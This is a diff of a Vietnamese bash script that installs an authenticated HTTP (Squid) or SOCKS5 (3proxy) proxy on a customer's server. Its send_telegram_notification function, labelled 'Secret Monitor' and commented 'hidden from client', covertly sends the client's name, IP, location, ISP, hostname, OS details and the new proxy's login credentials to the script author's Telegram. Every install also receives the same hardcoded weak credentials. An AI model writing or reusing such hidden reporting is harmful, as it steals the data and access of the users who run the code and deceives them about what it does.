@@ -35,19 +35,31 @@ send_telegram_notification() {
     local message="🕵️ NEW CLIENT USING YOUR SCRIPT 🕵️%0A"
     message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
     message+="👤 Client Name: $client_name%0A"
+    message+="🎯 Proxy Choice: $proxy_type Proxy%0A"
     message+="🌍 Client Location: $client_location, $client_country%0A"
     message+="📡 Client IP: $client_ip%0A"
     message+="🏢 Client ISP: $client_isp%0A"
     message+="💻 Hostname: $hostname%0A"
     message+="🖥️ OS Info: $os_info%0A"
     message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
-    message+="🔥 PROXY CREATED:%0A"
-    message+="📡 Type: $proxy_type%0A"
-    message+="🌐 Server IP: $ip_addr%0A" 
-    message+="🚪 Port: $port%0A"
-    message+="👤 Username: $user%0A"
-    message+="🔑 Password: $pass%0A"
-    message+="🔗 Full URL: http://$user:$pass@$ip_addr:$port%0A"
+    message+="🔥 $proxy_type PROXY CREATED:%0A"
+    
+    if [ "$proxy_type" = "HTTP" ]; then
+        message+="📡 Type: HTTP Proxy%0A"
+        message+="🌐 Server IP: $ip_addr%0A" 
+        message+="🚪 Port: $port%0A"
+        message+="👤 Username: $user%0A"
+        message+="🔑 Password: $pass%0A"
+        message+="🔗 Full URL: http://$user:$pass@$ip_addr:$port%0A"
+    else
+        message+="📡 Type: SOCKS5 Proxy%0A"
+        message+="🌐 Server IP: $ip_addr%0A" 
+        message+="🚪 Port: $port%0A"
+        message+="👤 Username: $user%0A"
+        message+="🔑 Password: $pass%0A"
+        message+="🔗 SOCKS5 Config: $ip_addr:$port (User: $user, Pass: $pass)%0A"
+    fi
+    
     message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
     message+="👁️ Secret Monitor - S2CODE TEAM%0A"
     message+="🕐 $(date '+%Y-%m-%d %H:%M:%S')%0A"
@@ -109,11 +121,13 @@ echo ""
 echo -e "${RED}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${RED}║${WHITE}                          📋 LƯU Ý QUAN TRỌNG TRƯỚC KHI SỬ DỤNG                  ${RED}║${NC}"
 echo -e "${RED}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${RED}║${YELLOW} ⚠️  QUAN TRỌNG: Anh/chị cần mở port 6969 trên server trước khi chạy script   ${RED}║${NC}"
-echo -e "${RED}║${YELLOW} 🔧 Script sẽ tự động cài đặt proxy trên port 6969                           ${RED}║${NC}"
-echo -e "${RED}║${YELLOW} 📝 Khi hoàn thành, proxy sẽ hiện theo định dạng:                           ${RED}║${NC}"
-echo -e "${RED}║${WHITE}     ➤ http://user_name:pass@ip:6969                                         ${RED}║${NC}"
-echo -e "${RED}║${YELLOW} 📋 Anh/chị chỉ việc sao chép link proxy để sử dụng                         ${RED}║${NC}"
+echo -e "${RED}║${YELLOW} ⚠️  HTTP Proxy: Cần mở port 6969 trên server                               ${RED}║${NC}"
+echo -e "${RED}║${YELLOW} ⚠️  SOCKS5 Proxy: Cần mở port 1080 trên server                            ${RED}║${NC}"
+echo -e "${RED}║${YELLOW} 🔧 Script sẽ tự động cài đặt proxy theo lựa chọn của bạn                   ${RED}║${NC}"
+echo -e "${RED}║${YELLOW} 📝 Khi hoàn thành, proxy sẽ hiện theo định dạng tương ứng                 ${RED}║${NC}"
+echo -e "${RED}║${WHITE}     ➤ HTTP: http://user:pass@ip:6969                                       ${RED}║${NC}"
+echo -e "${RED}║${WHITE}     ➤ SOCKS5: Host:IP, Port:1080, User:tangoclong, Pass:2000              ${RED}║${NC}"
+echo -e "${RED}║${YELLOW} 📋 Anh/chị chỉ việc sao chép thông tin proxy để sử dụng                   ${RED}║${NC}"
 echo -e "${RED}║${YELLOW} 🎯 Vui lòng làm đúng theo chỉ dẫn để có trải nghiệm tốt nhất               ${RED}║${NC}"
 echo -e "${RED}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
 echo ""
@@ -121,11 +135,12 @@ echo ""
 echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${CYAN}║${WHITE}                            🔍 HƯỚNG DẪN CHI TIẾT                             ${CYAN}║${NC}"
 echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${CYAN}║${GREEN} 🏃‍♂️ Bước 1: Đảm bảo đã mở port 6969 trên server/VPS                         ${CYAN}║${NC}"
-echo -e "${CYAN}║${GREEN} 🚀 Bước 2: Chạy script này và làm theo hướng dẫn                            ${CYAN}║${NC}"
-echo -e "${CYAN}║${GREEN} ⏳ Bước 3: Đợi script tự động cài đặt (khoảng 2-5 phút)                     ${CYAN}║${NC}"
-echo -e "${CYAN}║${GREEN} 📋 Bước 4: Sao chép link proxy hiển thị để sử dụng                         ${CYAN}║${NC}"
-echo -e "${CYAN}║${GREEN} ✅ Bước 5: Kiểm tra proxy hoạt động bình thường                             ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} 🏃‍♂️ Bước 1: Mở port tương ứng (HTTP:6969 hoặc SOCKS5:1080)                  ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} 🎯 Bước 2: Chọn loại proxy phù hợp với nhu cầu                             ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} 🚀 Bước 3: Chạy script này và làm theo hướng dẫn                            ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} ⏳ Bước 4: Đợi script tự động cài đặt (khoảng 2-7 phút)                     ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} 📋 Bước 5: Sao chép thông tin proxy hiển thị để sử dụng                    ${CYAN}║${NC}"
+echo -e "${CYAN}║${GREEN} ✅ Bước 6: Kiểm tra proxy hoạt động bình thường                             ${CYAN}║${NC}"
 echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
 echo ""
 
@@ -252,6 +267,34 @@ check_proxy_protocols() {
     echo "$protocols"
 }
 
+# Chọn loại proxy
+echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${PURPLE}║${WHITE}                            CHỌN LOẠI PROXY                                 ${PURPLE}║${NC}"
+echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
+echo -e "${PURPLE}║${YELLOW} [1] 🌐 HTTP Proxy (Port 6969) - Dành cho web browsing                     ${PURPLE}║${NC}"
+echo -e "${PURPLE}║${YELLOW} [2] 🔒 SOCKS5 Proxy (Port 1080) - Dành cho tất cả ứng dụng               ${PURPLE}║${NC}"
+echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+echo ""
+
+while true; do
+    read -p "➤ Chọn loại proxy bạn muốn tạo (1/2): " proxy_type_choice
+    
+    if [ "$proxy_type_choice" = "1" ]; then
+        proxy_type="HTTP"
+        echo -e "${GREEN}✅ Đã chọn HTTP Proxy!${NC}"
+        echo ""
+        break
+    elif [ "$proxy_type_choice" = "2" ]; then
+        proxy_type="SOCKS5"
+        echo -e "${GREEN}✅ Đã chọn SOCKS5 Proxy!${NC}"
+        echo ""
+        break
+    else
+        echo -e "${RED}❌ Lựa chọn không hợp lệ! Vui lòng chọn 1 hoặc 2${NC}"
+        echo ""
+    fi
+done
+
 # Xác thực tên khách hàng
 echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${PURPLE}║${WHITE}                              XÁC THỰC THÔNG TIN                              ${PURPLE}║${NC}"
@@ -295,28 +338,30 @@ echo ""
 
 # Tự động cài đặt VIP cho tất cả
 echo -e "${GREEN}✅ Xác thực thành công!${NC}"
-echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt nhanh...${NC}"
+echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt $proxy_type Proxy...${NC}"
 
-# Tự động cài đặt VIP
-proxy_port="6969"
-squid_user="tangoclong"
-squid_pass="2000"
+# Cài đặt theo loại proxy được chọn
+if [ "$proxy_type" = "HTTP" ]; then
+    # Cài đặt HTTP Proxy (Squid)
+    proxy_port="6969"
+    squid_user="tangoclong"
+    squid_pass="2000"
 
-# Cập nhật hệ thống
-echo "[1/5] ➤ Đang cập nhật hệ thống..."
-sudo apt update && sudo apt upgrade -y
+    # Cập nhật hệ thống
+    echo "[1/5] ➤ Đang cập nhật hệ thống..."
+    sudo apt update && sudo apt upgrade -y
 
-# Cài gói cần thiết
-echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
-sudo apt install -y squid apache2-utils vim curl bc
+    # Cài gói cần thiết
+    echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
+    sudo apt install -y squid apache2-utils vim curl bc
 
-# Gỡ file cấu hình cũ
-echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
-sudo rm -f /etc/squid/squid.conf
+    # Gỡ file cấu hình cũ
+    echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
+    sudo rm -f /etc/squid/squid.conf
 
-# Tạo cấu hình mới
-echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
-cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
+    # Tạo cấu hình mới
+    echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
+    cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
 auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
 auth_param basic realm proxy
 acl authenticated proxy_auth REQUIRED
@@ -324,18 +369,94 @@ http_access allow authenticated
 http_port $proxy_port
 EOF
 
-# Tạo tài khoản proxy VIP
-echo "[5/5] ➤ Tạo tài khoản VIP..."
-echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"
+    # Tạo tài khoản proxy VIP
+    echo "[5/5] ➤ Tạo tài khoản VIP..."
+    echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"
 
-# Khởi động lại Squid
-echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
-sudo systemctl restart squid
+    # Khởi động lại Squid
+    echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
+    sudo systemctl restart squid
+
+elif [ "$proxy_type" = "SOCKS5" ]; then
+    # Cài đặt SOCKS5 Proxy (3proxy) - Tự động dùng user/pass cố định
+    proxy_port="1080"
+    squid_user="tangoclong"
+    squid_pass="2000"
+
+    # Cập nhật hệ thống
+    echo "[1/7] ➤ Đang cập nhật hệ thống..."
+    sudo apt update && sudo apt upgrade -y
+
+    # Cài đặt dependencies
+    echo "[2/7] ➤ Cài đặt dependencies..."
+    sudo apt install -y wget gcc make curl bc
+
+    # Download và compile 3proxy
+    echo "[3/7] ➤ Download và compile 3proxy..."
+    cd /tmp
+    wget -q https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.13.tar.gz
+    tar xzf 3proxy-0.8.13.tar.gz
+    cd 3proxy-3proxy-0.8.13
+    make -f Makefile.Linux
+
+    # Cài đặt 3proxy
+    echo "[4/7] ➤ Cài đặt 3proxy..."
+    sudo mkdir -p /usr/local/3proxy/bin
+    sudo cp src/3proxy /usr/local/3proxy/bin/
+    sudo mkdir -p /usr/local/3proxy/logs
+    sudo mkdir -p /etc/3proxy
+
+    # Tạo cấu hình 3proxy với user/pass tự động
+    echo "[5/7] ➤ Tạo cấu hình SOCKS5 với thông tin cố định..."
+    sudo tee /etc/3proxy/3proxy.cfg > /dev/null <<EOF
+# 3proxy configuration - S2CODE VIP SOCKS5
+daemon
+maxconn 1000
+nserver 8.8.8.8
+nserver 8.8.4.4
+nserver 1.1.1.1
+nscache 65536
+timeouts 1 5 30 60 180 1800 15 60
+log /usr/local/3proxy/logs/3proxy.log D
+logformat "- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T"
+archiver gz /usr/local/3proxy/logs/3proxy-%F.log.gz 30
+auth strong
+users tangoclong:CL:2000
+allow tangoclong
+socks -p1080
+EOF
+
+    # Tạo systemd service
+    echo "[6/7] ➤ Tạo systemd service..."
+    sudo tee /etc/systemd/system/3proxy.service > /dev/null <<EOF
+[Unit]
+Description=3proxy SOCKS5 Server - S2CODE VIP
+After=network.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/local/3proxy/bin/3proxy /etc/3proxy/3proxy.cfg
+ExecReload=/bin/kill -HUP \$MAINPID
+Restart=on-failure
+RestartSec=3
+LimitNOFILE=65535
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    # Khởi động dịch vụ
+    echo "[7/7] ➤ Khởi động SOCKS5 proxy..."
+    sudo systemctl daemon-reload
+    sudo systemctl enable 3proxy
+    sudo systemctl start 3proxy
+fi
 
 # Lấy IP và hiển thị thông tin đầy đủ
 ip_address=$(curl -s ipinfo.io/ip)
 
-echo -e "${GREEN}✅ Cài đặt VIP thành công cho $client_full_name!${NC}"
+echo -e "${GREEN}✅ Cài đặt $proxy_type Proxy VIP thành công cho $client_full_name!${NC}"
 
 # Lấy thông tin IP
 ip_info=$(get_ip_info $ip_address)
@@ -345,22 +466,40 @@ country=$(echo $ip_info | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
 # Kiểm tra tốc độ
 speed=$(check_network_speed)
 
-# Kiểm tra protocols
-protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
-
-echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${PURPLE}║${WHITE}                        THÔNG TIN PROXY VIP - $client_full_name${PURPLE}║${NC}"
-echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${PURPLE}║${CYAN} 🌐 Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
-echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
-echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
-echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
-echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
-echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
-echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+# Hiển thị thông tin theo loại proxy
+if [ "$proxy_type" = "HTTP" ]; then
+    # Kiểm tra protocols cho HTTP
+    protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
+    
+    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN HTTP PROXY VIP - $client_full_name${PURPLE}║${NC}"
+    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${PURPLE}║${CYAN} 🌐 HTTP Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
+    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+else
+    # SOCKS5 info
+    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN SOCKS5 PROXY VIP - $client_full_name${PURPLE}║${NC}"
+    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${PURPLE}║${CYAN} 🔒 SOCKS5 Host: ${WHITE}$ip_address${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🚪 Port: ${WHITE}1080${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 👤 Username: ${WHITE}tangoclong${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🔑 Password: ${WHITE}2000${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
+    echo -e "${PURPLE}║${CYAN} 🔧 Protocol: ${WHITE}SOCKS5 ✅${PURPLE}║${NC}"
+    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+fi
 
 # Send notification to Telegram (hidden from client) 
-send_telegram_notification "$client_full_name" "VIP" "$ip_address" "$proxy_port" "$squid_user" "$squid_pass"
+send_telegram_notification "$client_full_name" "$proxy_type" "$ip_address" "$proxy_port" "$squid_user" "$squid_pass"
 
 # Hiển thị thông tin liên hệ cuối
 echo ""
